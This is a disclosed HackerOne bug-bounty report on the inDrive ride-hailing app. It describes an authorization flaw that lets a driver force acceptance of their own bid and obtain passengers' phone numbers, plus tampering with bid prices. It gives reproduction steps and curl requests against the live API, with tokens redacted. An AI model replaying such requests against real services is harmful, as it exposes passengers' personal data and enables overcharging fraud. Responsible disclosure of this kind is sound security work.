# Rider can forcefully get passenger's order accepted resulting in multiple impacts including PII reveal  and more mentioned in the report.

## Report Details
- **Report ID**: 1960107
- **URL**: https://hackerone.com/reports/1960107
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-04-24T11:40:24.169Z
- **Disclosed**: 2023-06-28T09:21:05.689Z

## Reporter
- **Username**: spongebhav
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: indrive

## Vulnerability Information
## Summary:
Hello Indrive Security Team,
This is going to be chain of attacks with major flow being in /api/setTenderStatus request allowing the attacker to get their ride request accepted automatically.

## Steps To Reproduce:

1st major vulnerability:
// Forcefully getting the passenger to accept the ride

### Section 1

1. Whenever a rider/driver offers the passenger their price there is a request that is sent to /api/driverrequest

█████

2. Now after getting the tenderID and OrderID from that request, the rider sends the request in /api/setTenderStatus in this format

█████████

Here the orderID and tenderID is from step 1.

3. The ride gets accepted.



The impact for this is "The rider can get details of any passenger, this includes phone number of passengers. Even when the passenger doesn't accept the riders offer."
Please keep in mind that this can be automated in real time to make this attack more efficien.

2nd Chain vulnerability:
// Chose a out of range price

### Section 2

1. This request is sent when the rider bids his price: 

██████████

2. The rider can modify the price range to be of a much higher value than that.
3. Resulting in sending a bid that is significantly more

// Combining this with above vulnerability we can get passenger to forcefully accept the ride of the customer.



==Provide the request in curl format, if possible==

For vuln A:

```
curl https://terra-akamai.indriverapp.com/api/setTenderStatus?cid=5957&locale=en_US&phone=████&token=████████&v=7&stream_id=1682280490209367&tender_id=████████&order_id=█████████&status=accept
```

For vuln B:

```
curl https://terra-akamai.indriverapp.com/api/driverrequest?cid=5957&locale=en_US&job_id=338f72ff-f3c1-4da0-af15-5d1aa720146b&phone=██████████&token=████████&v=7&stream_id=1682279074257167&order_id=██████&client_id=█████████&shield_session_id=██████████&type=indriver&price=63&period=3&geo_arrival_time=1&distance=5&longitude=85.3249627&latitude=27.7390611&sn=1
```



Thank you so much.
Let me know if you need any further help in reproducing this issue.
@spongebhav

## Impact

1. Revealing PII of customers even if customer didn't accept the rider's request.
2. Making customer accept a bid that is significantly higher tricking the customer into giving more money.

## Attachments
No attachments
